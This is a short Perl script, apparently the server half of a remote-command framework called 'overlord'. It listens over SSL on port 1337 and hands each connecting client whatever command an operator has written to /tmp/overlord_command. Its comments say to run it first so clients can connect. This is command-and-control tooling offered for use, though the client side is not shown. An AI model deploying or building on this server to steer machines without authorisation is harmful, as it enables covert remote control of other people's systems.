#this is the server listening script.
#run this first, this is what clients will connect to

#!/usr/bin/perl
use strict;
use warnings;
use base qw(Net::Server::HTTP); 
print "Framework loaded, run command_shell\n";
my $reset = qx (echo "" > /tmp/overlord_command);
$|=1;
my $pwd = qx(pwd);
chomp $pwd;
main->run(
	port=> "1337/ssl",
	ipv => 'ipv4',
	proto => 'ssl',
	SSL_key_file => "$pwd/ssl/overlord.key",
	SSL_cert_file => "$pwd/ssl/overlord.crt",
);
sub process_http_request {
    #while (1) {
	#todo change this to perlism read
    my $command = qx(cat /tmp/overlord_command);
    print "Content-type: text/html\n\n";
    print "$command\n";
    #}
    exit;
    }
